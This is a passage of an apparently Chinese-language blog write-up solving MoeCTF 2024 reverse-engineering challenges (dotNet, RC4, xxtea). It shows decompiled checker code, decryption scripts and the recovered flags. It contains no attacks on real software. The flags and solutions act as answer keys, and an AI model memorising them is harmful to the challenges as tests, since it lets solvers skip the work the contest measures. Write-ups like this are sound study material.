<span class="built_in">sum</span>.value + k[<span class="built_in">sum</span>.value &amp; <span class="number">3</span>].value</span><br><span class="line">        )</span><br><span class="line">    <span class="keyword">return</span> (l.value, r.value)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dword2byte</span>(<span class="params">x: <span class="type">List</span>[<span class="built_in">int</span>]</span>):</span><br><span class="line">    result = []</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span>(x) == <span class="built_in">int</span>:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">            result.append((x &gt;&gt; j*<span class="number">8</span>) &amp; <span class="number">0xff</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">bytes</span>(result)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(x)):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">            result.append((x[i] &gt;&gt; j*<span class="number">8</span>) &amp; <span class="number">0xff</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(result)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Internal Functions Of Regadgets</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>所以最后的flag是<code>moectf&#123;moectf2024!!&#125;</code></p><h1 id="dotNet-d0tN3t"><a href="#dotNet-d0tN3t" class="headerlink" title="dotNet(d0tN3t)"></a>dotNet(d0tN3t)</h1><p>dll（核心代码）拖入dnSpy进行分析</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.CompilerServices;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Token: 0x02000002 RID: 2</span></span><br><span class="line">[<span class="meta">CompilerGenerated</span>]</span><br><span class="line"><span class="keyword">internal</span> <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// Token: 0x06000001 RID: 1 RVA: 0x00002050 File Offset: 0x00000250</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> &lt;Main&gt;$(<span class="built_in">string</span>[] args)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">byte</span>[] array = <span class="keyword">new</span> <span class="built_in">byte</span>[]</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="number">0xAD</span>,</span><br><span class="line">            .....</span><br><span class="line">            <span class="number">0xA4</span></span><br><span class="line">        &#125;;</span><br><span class="line">        Console.WriteLine(<span class="string">&quot;Input Your Flag:&quot;</span>);</span><br><span class="line">        <span class="built_in">string</span> text = Console.ReadLine();</span><br><span class="line">        <span class="keyword">if</span> (text.Length != array.Length)</span><br><span class="line">        &#123;</span><br><span class="line">            Console.WriteLine(<span class="string">&quot;Flag is WRONG!!!&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">int</span> num = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; array.Length; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> ((<span class="built_in">byte</span>)((<span class="built_in">int</span>)((<span class="built_in">byte</span>)text[i] + <span class="number">0x72</span> ^ <span class="number">0x72</span>) ^ i * i) != array[i])</span><br><span class="line">            &#123;</span><br><span class="line">                num &amp;= <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (num == <span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            Console.WriteLine(<span class="string">&quot;Correct Flag!!!&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        Console.WriteLine(<span class="string">&quot;Flag is WRONG!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意到flag的加密逻辑</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="built_in">byte</span>)((<span class="built_in">int</span>)((<span class="built_in">byte</span>)text[i] + <span class="number">0x72</span> ^ <span class="number">0x72</span>) ^ i * i)</span><br></pre></td></tr></table></figure><p>写出解密脚本即可</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">byte</span>[] s3cr3t = &#123;<span class="number">173</span>, <span class="number">146</span>, <span class="number">161</span>, <span class="number">174</span>, <span class="number">132</span>, <span class="number">179</span>, <span class="number">187</span>, <span class="number">234</span>, <span class="number">231</span>, <span class="number">244</span>, <span class="number">177</span>, <span class="number">161</span>, <span class="number">65</span>, <span class="number">13</span>, <span class="number">18</span>, <span class="number">12</span>, <span class="number">166</span>, <span class="number">247</span>, <span class="number">229</span>, <span class="number">207</span>, <span class="number">125</span>, <span class="number">109</span>, <span class="number">67</span>, <span class="number">180</span>, <span class="number">230</span>, <span class="number">156</span>, <span class="number">125</span>, <span class="number">127</span>, <span class="number">182</span>, <span class="number">236</span>, <span class="number">105</span>, <span class="number">21</span>, <span class="number">215</span>, <span class="number">148</span>, <span class="number">92</span>, <span class="number">18</span>, <span class="number">199</span>, <span class="number">137</span>, <span class="number">124</span>, <span class="number">38</span>, <span class="number">228</span>, <span class="number">55</span>, <span class="number">62</span>, <span class="number">164</span>&#125;;</span><br><span class="line"><span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; s3cr3t.Length; i++)</span><br><span class="line">&#123;</span><br><span class="line">    Console.Out.Write((<span class="built_in">char</span>)((<span class="built_in">byte</span>)(s3cr3t[i] ^ i*i ^ <span class="number">114</span>) - <span class="number">114</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同时我们给出python的exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">enc = [<span class="number">173</span>, <span class="number">146</span>, <span class="number">161</span>, <span class="number">174</span>, <span class="number">132</span>, <span class="number">179</span>, <span class="number">187</span>, <span class="number">234</span>, <span class="number">231</span>, <span class="number">244</span>, <span class="number">177</span>, <span class="number">161</span>, <span class="number">65</span>, <span class="number">13</span>, <span class="number">18</span>, <span class="number">12</span>, <span class="number">166</span>, <span class="number">247</span>, <span class="number">229</span>, <span class="number">207</span>, <span class="number">125</span>, <span class="number">109</span>, <span class="number">67</span>, <span class="number">180</span>, <span class="number">230</span>, <span class="number">156</span>, <span class="number">125</span>, <span class="number">127</span>, <span class="number">182</span>, <span class="number">236</span>, <span class="number">105</span>, <span class="number">21</span>, <span class="number">215</span>, <span class="number">148</span>, <span class="number">92</span>, <span class="number">18</span>, <span class="number">199</span>, <span class="number">137</span>, <span class="number">124</span>, <span class="number">38</span>, <span class="number">228</span>, <span class="number">55</span>, <span class="number">62</span>, <span class="number">164</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc)):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(((i*i ^ <span class="number">114</span> ^ enc[i]) - <span class="number">114</span>) &amp; <span class="number">0xff</span>), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># moectf&#123;7ce581d2-b2ab-4ceb-9bbe-435873083db6&#125;</span></span><br></pre></td></tr></table></figure><p>由于很多人用Python写的，但是没有注意到Python的int是无限精度的，所以我们必须限制它在0xff(byte)的范围内，才可以解出flag，不然可能会出现负数的情况。<br>flag: <code>moectf&#123;7ce581d2-b2ab-4ceb-9bbe-435873083db6&#125;</code></p><h1 id="RC4"><a href="#RC4" class="headerlink" title="RC4"></a>RC4</h1><p>拖入IDA，我们发现ida没有找到main函数，这时按Shift+F12，定位String，然后对着String按X（交叉引用），就可以定位到main函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_4013F0</span><span class="params">(__int64 a1, <span class="type">const</span> <span class="type">char</span> *a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// rax</span></span><br><span class="line">  __int64 v3; <span class="comment">// rax</span></span><br><span class="line">  __int64 v4; <span class="comment">// rax</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+18h] [rbp-88h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+24h] [rbp-7Ch]</span></span><br><span class="line">  __int64 v8; <span class="comment">// [rsp+28h] [rbp-78h]</span></span><br><span class="line">  _BYTE v9[<span class="number">72</span>]; <span class="comment">// [rsp+50h] [rbp-50h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v10; <span class="comment">// [rsp+98h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v10 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v2 = sub_404748(<span class="string">&quot;A71A68ECD82711CC8C9B16155CD2673E82ADCE75D4BC5756C28A52B86BD6CCF8A4BA722FE05715B92411&quot;</span>);</span><br><span class="line">  v8 = sub_401B01(v2 &gt;&gt; <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>;</span><br><span class="line">        i &lt; (<span class="type">unsigned</span> __int64)sub_404748(<span class="string">&quot;A71A68ECD82711CC8C9B16155CD2673E82ADCE75D4BC5756C28A52B86BD6CCF8A4BA722FE05715B92411&quot;</span>) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">        ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_40202D((__int64)&amp;aA71a68ecd82711[<span class="number">2</span> * i], (__int64)<span class="string">&quot;%02x&quot;</span>, i + v8);</span><br><span class="line">  &#125;</span><br><span class="line">  sub_401F8D(<span class="string">&quot;Welcome to MoeCTF 2024!&quot;</span>);</span><br><span class="line">  sub_401F8D(<span class="string">&quot;This is a simple RC4 challenge.&quot;</span>);</span><br><span class="line">  sub_401ECD((__int64)<span class="string">&quot;Enter your flag: &quot;</span>);</span><br><span class="line">  sub_401BCC(&amp;unk_40E120);</span><br><span class="line">  sub_401D17(v9, <span class="number">64LL</span>, &amp;unk_40E020);</span><br><span class="line">  v9[sub_40469F(v9, <span class="string">&quot;\n&quot;</span>)] = <span class="number">0</span>;</span><br><span class="line">  v3 = sub_404748(v9);</span><br><span class="line">  v6 = sub_401B01(<span class="number">4</span> * v3);</span><br><span class="line">  sub_401360(<span class="string">&quot;RC4_1s_4w3s0m3&quot;</span>, v9, v6);</span><br><span class="line">  v4 = sub_404748(v9);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)sub_404679(v6, v8, v4) )</span><br><span class="line">    sub_401F8D(<span class="string">&quot;Wrong!&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    sub_401F8D(<span class="string">&quot;Correct!&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( __readfsqword(<span class="number">0x28</span>u) != v10 )</span><br><span class="line">    sub_40183E();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>显然题目说了是Rc4，并且<code>RC4_1s_4w3s0m3</code>很可能是密码，我们直接拿上面的HEX进行解密就出了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(rc4_crypt(rc4_init(<span class="string">b&quot;RC4_1s_4w3s0m3&quot;</span>), <span class="built_in">bytes</span>.fromhex(<span class="string">&#x27;A71A68ECD82711CC8C9B16155CD2673E82ADCE75D4BC5756C28A52B86BD6CCF8A4BA722FE05715B92411&#x27;</span>)))</span><br><span class="line"><span class="comment"># b&#x27;moectf&#123;why_Rc4_haS_The_Rev32sabl3_pr0ceSS&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">from regadgets import *</span></span><br><span class="line"><span class="string">Internal Functions Of Regadgets</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">List</span>, Iterator</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_init</span>(<span class="params">key: <span class="built_in">bytes</span>, box_size: <span class="built_in">int</span> = <span class="number">256</span></span>) -&gt; <span class="type">List</span>[<span class="built_in">int</span>]:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span>(key) == <span class="built_in">str</span>:</span><br><span class="line">        key = key.encode()</span><br><span class="line">    s = <span class="built_in">list</span>(<span class="built_in">range</span>(box_size))</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    key_length = <span class="built_in">len</span>(key)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Key scheduling algorithm (KSA)</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(box_size):</span><br><span class="line">        <span class="comment"># permit key is empty.</span></span><br><span class="line">        j = (j + s[i] + <span class="number">0</span> <span class="keyword">if</span> key_length == <span class="number">0</span> <span class="keyword">else</span> j + s[i] + key[i % key_length]) % box_size</span><br><span class="line">        <span class="comment"># Swap s[i], s[j]</span></span><br><span class="line">        s[i], s[j] = s[j], s[i]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_crypt</span>(<span class="params">s: <span class="built_in">bytes</span>, data: <span class="built_in">bytes</span>, box_size: <span class="built_in">int</span> = <span class="number">256</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    i, j = <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">    result = <span class="built_in">bytearray</span>()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Pseudo-random generation algorithm (PRGA)</span></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)):</span><br><span class="line">        i = (i + <span class="number">1</span>) %  box_size</span><br><span class="line">        j = (j + s[i]) % box_size</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Swap s[i], s[j]</span></span><br><span class="line">        s[i], s[j] = s[j], s[i]</span><br><span class="line"></span><br><span class="line">        t = (s[i] + s[j]) % box_size</span><br><span class="line">        result.append(data[k] ^ s[t])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(result)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Internal Functions Of Regadgets</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">```python</span><br><span class="line"></span><br><span class="line"><span class="comment"># xxtea</span></span><br><span class="line">给出题目源码</span><br><span class="line">```c</span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;string.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdint.h&gt;</span></span><br><span class="line"><span class="comment">#define DELTA 0x9e3779b9</span></span><br><span class="line"><span class="comment">#define MX (((z&gt;&gt;5^y&lt;&lt;2) + (y&gt;&gt;3^z&lt;&lt;4)) ^ ((sum^y) + (key[((p&amp;3)^e)&amp;0xff] ^ z)))</span></span><br><span class="line"></span><br><span class="line">void btea(uint32_t* v, <span class="built_in">int</span> n, const uint32_t key[<span class="number">4</span>])</span><br><span class="line">&#123;</span><br><span class="line">    uint32_t y, z, <span class="built_in">sum</span>;</span><br><span class="line">    unsigned p, rounds, e;</span><br><span class="line">    <span class="keyword">if</span> (n &gt; <span class="number">1</span>)            /* Coding Part */</span><br><span class="line">    &#123;</span><br><span class="line">        rounds = <span class="number">6</span> + <span class="number">52</span> / n;</span><br><span class="line">        <span class="built_in">sum</span> = <span class="number">0</span>;</span><br><span class="line">        z = v[n - <span class="number">1</span>];</span><br><span class="line">        do</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">sum</span> += DELTA;</span><br><span class="line">            e = (<span class="built_in">sum</span> &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">            <span class="keyword">for</span> (p = <span class="number">0</span>; p &lt; n - <span class="number">1</span>; p++)</span><br><span class="line">            &#123;</span><br><span class="line">                y = v[p + <span class="number">1</span>];</span><br><span class="line">                z = v[p] += MX;</span><br><span class="line">            &#125;</span><br><span class="line">            y = v[<span class="number">0</span>];</span><br><span class="line">            z = v[n - <span class="number">1</span>] += MX;</span><br><span class="line">        &#125; <span class="keyword">while</span> (--rounds);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (n &lt; -<span class="number">1</span>)      /* Decoding Part */</span><br><span class="line">    &#123;</span><br><span class="line">        n = -n;</span><br><span class="line">        rounds = <span class="number">6</span> + <span class="number">52</span> / n;</span><br><span class="line">        <span class="built_in">sum</span> = rounds * DELTA;</span><br><span class="line">        y = v[<span class="number">0</span>];</span><br><span class="line">        do</span><br><span class="line">        &#123;</span><br><span class="line">            e = (<span class="built_in">sum</span> &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">            <span class="keyword">for</span> (p = n - <span class="number">1</span>; p &gt; <span class="number">0</span>; p--)</span><br><span class="line">            &#123;</span><br><span class="line">                z = v[p - <span class="number">1</span>];</span><br><span class="line">                y = v[p] -= MX;</span><br><span class="line">            &#125;</span><br><span class="line">            z = v[n - <span class="number">1</span>];</span><br><span class="line">            y = v[<span class="number">0</span>] -= MX;</span><br><span class="line">            <span class="built_in">sum</span> -= DELTA;</span><br><span class="line">        &#125; <span class="keyword">while</span> (--rounds);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">int</span> main() &#123;</span><br><span class="line">    unsigned char enc[] = &#123; <span class="number">0x64</span>,<span class="number">0xf5</span>,<span class="number">0xe1</span>,<span class="number">0x78</span>,<span class="number">0xe1</span>,<span class="number">0xf0</span>,</span><br><span class="line"><span class="number">0x35</span>,<span class="number">0xa8</span>,<span class="number">0x34</span>,<span class="number">0xff</span>,<span class="number">0x12</span>,<span class="number">0x05</span>,</span><br><span class="line"><span class="number">0xfb</span>,<span class="number">0x13</span>,<span class="number">0xe9</span>,<span class="number">0xb0</span>,<span class="number">0x50</span>,<span class="number">0xa3</span>,</span><br><span class="line"><span class="number">0xb9</span>,<span class="number">0x89</span>,<span class="number">0xb1</span>,<span class="number">0xda</span>,<span class="number">0x43</span>,<span class="number">0xc9</span>,</span><br><span class="line"><span class="number">0x4f</span>,<span class="number">0xc8</span>,<span class="number">0xdb</span>,<span class="number">0x01</span>,<span class="number">0x20</span>,<span class="number">0xdb</span>,</span><br><span class="line"><span class="number">0x16</span>,<span class="number">0xaf</span>,<span class="number">0xed</span>,<span class="number">0x67</span>,<span class="number">0x17</span>,<span class="number">0x96</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="built_in">int</span> r = <span class="number">9</span>;</span><br><span class="line">    unsigned char input_key[<span class="number">13</span>] = <span class="string">&quot;moectf2024!!&quot;</span>; </span><br><span class="line">    const uint32_t k[<span class="number">4</span>] = &#123; *((uint32_t*)input_key),*((uint32_t*)(input_key + <span class="number">4</span>)), *((uint32_t*)(input_key + <span class="number">8</span>)),<span class="number">0xccffbbbb</span> &#125;;</span><br><span class="line">    btea(((uint32_t*)enc),-r,k);</span><br><span class="line">    //btea(((uint32_t*)<span class="built_in">input</span>), -r, ((uint32_t*)input_key));</span><br><span class="line">    <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; <span class="number">36</span>; i++) &#123;</span><br><span class="line">        printf(<span class="string">&quot;%c&quot;</span>,enc[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>EXP:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DELTA 0x9e3779b9</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MX (((z&gt;&gt;5^y<span class="string">&lt;&lt;2) + (y&gt;</span>&gt;3^z&lt;&lt;4)) ^ ((sum^y) + (key[((p&amp;3)^e)&amp;0xff] ^ z)))</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">btea</span><span class="params">(<span class="type">uint32_t</span>* v, <span class="type">int</span> n, <span class="type">const</span> <span class="type">uint32_t</span> key[<span class="number">4</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> y, z, sum;</span><br><span class="line">    <span class="type">unsigned</span> p, rounds, e;</span><br><span class="line">    <span class="keyword">if</span> (n &gt; <span class="number">1</span>)            <span class="comment">/* Coding Part */</span></span><br><span class="line">    &#123;</span><br><span class="line">        rounds = <span class="number">6</span> + <span class="number">52</span> / n;</span><br><span class="line">        sum = <span class="number">0</span>;</span><br><span class="line">        z = v[n - <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            sum += DELTA;</span><br><span class="line">            e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">            <span class="keyword">for</span> (p = <span class="number">0</span>; p &lt; n - <span class="number">1</span>; p++)</span><br><span class="line">            &#123;</span><br><span class="line">                y = v[p + <span class="number">1</span>];</span><br><span class="line">                z = v[p] += MX;</span><br><span class="line">            &#125;</span><br><span class="line">            y = v[<span class="number">0</span>];</span><br><span class="line">            z = v[n - <span class="number">1</span>] += MX;</span><br><span class="line">        &#125; <span class="keyword">while</span> (--rounds);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (n &lt; <span class="number">-1</span>)      <span class="comment">/* Decoding Part */</span></span><br><span class="line">    &#123;</span><br><span class="line">        n = -n;</span><br><span class="line">        rounds = <span class="number">6</span> + <span class="number">52</span> / n;</span><br><span class="line">        sum = rounds * DELTA;</span><br><span class="line">        y = v[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">            <span class="keyword">for</span> (p = n - <span class="number">1</span>; p &gt; <span class="number">0</span>; p--)</span><br><span class="line">            &#123;</span><br><span class="line">                z = v[p - <span class="number">1</span>];</span><br><span class="line">                y = v[p] -= MX;</span><br><span class="line">            &#125;</span><br><span class="line">            z = v[n - <span class="number">1</span>];</span><br><span class="line">            y = v[<span class="number">0</span>] -= MX;</span><br><span class="line">            sum -= DELTA;</span><br><span class="line">        &#125; <span class="keyword">while</span> (--rounds);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span 